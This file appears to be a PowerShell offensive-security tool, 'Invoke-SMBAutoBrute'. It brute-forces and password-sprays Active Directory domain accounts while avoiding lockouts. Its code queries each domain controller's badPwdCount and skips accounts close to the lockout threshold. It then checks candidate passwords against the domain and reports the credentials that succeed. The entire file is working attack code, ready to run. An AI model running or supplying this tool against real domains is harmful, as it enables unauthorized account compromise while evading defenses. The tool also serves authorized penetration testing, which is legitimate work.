function Invoke-SMBAutoBrute
{
<#
.SYNOPSIS

    Performs smart brute forcing of accounts against the current domain, ensuring that
	lockouts do not occur.

    Author: Jason Lang (@curi0usJack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.0

.DESCRIPTION

    This script takes either a list of users or, if not specified, will query the domain 
	for a list of users on every brute attempt. The users queried will have a badPwdCount 
	attribute of two less than the LockoutThreshold to ensure they are not locked in the brute
	attempt, with a new list being queried for every attempt. Designed to simply input the 
	LockoutThreshold as well as a password list and then run. Note that each DC is queried
	for bad password count for each user for each brute, so this script is noisy.

.EXAMPLE

    PS C:\> Invoke-SMBAutoBrute -PasswordList "jennifer, yankees" -LockoutThreshold 3

	[*] Performing prereq checks.
	[*] PDC: LAB-2008-DC1.lab.com
	[*] Passwords to test: jennifer, yankees, 123456
	[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...
	[+] Success! Username: TestUser6. Password: jennifer
	[+] Success! Username: TestUser99. Password: yankees
	[*] Completed.

.PARAMETER UserList

	A text file of userids (one per line) to brute. Do not append DOMAIN\ in front of the userid.
	If this parameter is not specified, the script will retrieve a new list of user accounts for
	each attempt to ensure accounts are not locked.
	
.PARAMETER PasswordList

	A comma separated list of passwords to attempt. 
	
.PARAMETER LockoutThreshold

	The domain setting that specifies the number of bad login attempts before the account locks.
	To discover this, open a command prompt from a domain joined machine and run "net accounts".
	
.PARAMETER Delay

	The delay time (in milliseconds) between each brute attempt. Default 100.
	
.PARAMETER ShowVerbose

	Will display Failed as well as Skipped attempts. Generates a ton of data.
	
.PARAMETER StopOnSuccess

	The script will exit after the first successful authentication.

#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $False)]
        [String] $UserList,

        [parameter(Mandatory = $True)]
        [String] $PasswordList,

        [parameter(Mandatory = $True)]
        [String] $LockoutThreshold,

        [parameter(Mandatory = $False)]
        [int] $Delay,

        [parameter(Mandatory = $False)]
        [Switch] $ShowVerbose,

        [parameter(Mandatory = $False)]
        [Switch] $StopOnSuccess
    )

    Begin
    {
        Set-StrictMode -Version 2

        Try {Add-Type -AssemblyName System.DirectoryServices.AccountManagement}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        Try {Add-Type -AssemblyName System.DirectoryServices}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        function Get-PDCe()
        {
            $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$env:UserDNSDomain)
            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context)
            return $domain.pdcRoleOwner
        }

        function Get-UserList($maxbadpwdcount)
        {
            $users = New-Object System.Collections.ArrayList
            $counttouse = $maxbadpwdcount - 2 # We have to use <= in our LDAP query. Use - 2 attempts to ensure the accounts are not locked with this attempt.
            $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$pdc"
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = "(&(objectclass=user)(badPwdCount<=$counttouse)(!userAccountControl:1.2.840.113556.1.4.803:=2))" #UAC = enabled accounts only
            $search.PageSize = 10
            $foundusers = $search.FindAll()
            if ($foundusers -ne $null)
            {
                foreach ($u in $foundusers)
                {
                    $users.Add([string]$u.Properties['samaccountname']) | Out-Null
                }
            }
            return $users
        }

        function Get-DomainControllers
        {
            $dcs = New-Object System.Collections.ArrayList
            $filter = "(&(objectclass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
            $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$pdc"
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = $filter
            $search.PropertiesToLoad.Add('CN') | Out-Null
            $results = $search.FindAll()
            foreach ($item in $results)
            {
                $dcs.Add($item.Properties['cn']) | Out-Null
            }
            $search = $null
            $de.Dispose()
            return $dcs
        }

        function Get-DCBadPwdCount($userid, $dc)
        {
            $count = -1
            $de = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$dc"
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = "(&(objectclass=user)(samaccountname=$userid))"
            $search.PropertiestoLoad.Add('badPwdCount') | Out-Null
            $user = $search.FindOne()
            if ($user -ne $null)
            {
                $count = $user.Properties['badpwdcount']
            }
            $search = $null
            $de.Dispose()
            return $count
        }

        function Get-UserBadPwdCount($userid, $dcs)
        {
            # The badPwdCount attribute is not replicated. Attempts should be reported back to the PDC,
            # but here get the greatest count from amongst all the DCs to guard against replication errors.
            $totalbadcount = -1
            foreach ($dc in $dcs)
            {
                $badcount = Get-DCBadPwdCount $userid $dc
                if ($badcount -gt $totalbadcount)
                {
                    $totalbadcount = $badcount
                }
            }
            return $totalbadcount
        }
    }

    Process
    {
        $validaccounts = @{}

        $userstotest = $null
        "[*] Performing prereq checks.`n"
        if ([String]::IsNullOrEmpty($UserList) -eq $false)
        {
            if ([System.IO.File]::Exists($UserList) -eq $false)
            {
                "[!] $UserList not found. Aborting.`n"
                exit
            }
            else
            {
                $userstotest = Get-Content $UserList
            }
        }

        $pdc = Get-PDCe

        if ($pdc -eq $null)
        {
            "[!] Could not locate domain controller. Aborting.`n"
            exit
        }

        "[*] PDC: $pdc`n"
        "[*] Passwords to test: $PasswordList`n"

        $dcs = Get-DomainControllers
        $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        $PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $pdc)

        $pwds = New-Object System.Collections.ArrayList
        foreach ($pwd in $PasswordList.Split(','))
        {
            $pwds.Add($pwd.Trim(' ')) | Out-Null
        }

        "[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...`n"
        foreach ($p in $pwds)
        {
            if ($userstotest -eq $null)
            {
                $userstotest = Get-UserList $LockoutThreshold
            }

            foreach ($u in $userstotest)
            {
                $userid = $u.Trim(' ').Trim([Environment]::Newline)
                if ($validaccounts.ContainsKey($userid) -eq $false)
                {
                    $attempts = Get-UserBadPwdCount $userid $dcs
                    if ($attempts -ne -1 -and $attempts -lt ($LockoutThreshold - 1))
                    {
                        $IsValid = $false
                        $IsValid = $PrincipalContext.ValidateCredentials($userid, $p).ToString()

                        if ($IsValid -eq $True)
                        {
                            "[+] Success! Username: $userid. Password: $p`n"
                            $validaccounts.Add($userid, $p)
                            if ($StopOnSuccess.IsPresent)
                            {
								"[*] StopOnSuccess. Exit.`n"
                                exit
                            }
                        }
                        else
                        {
                            if ($ShowVerbose.IsPresent)
                            {
                                "[-] Failed. Username: $userid. Password: $p. BadPwdCount: $($attempts + 1)`n"
                            }
                        }

                        if ($Delay)
                        {
                            Start-Sleep -m $Delay
                        }
                        else
                        {
                            Start-Sleep -m 100
                        }
                    }
                    else
                    {
                        if ($ShowVerbose.IsPresent)
                        {
                            "[-] Skipped. Username: $userid. Password: $p. BadPwdCount: $attempts`n"
                        }
                    }
                }
            }
        }
        "[*] Completed.`n"
    }
}
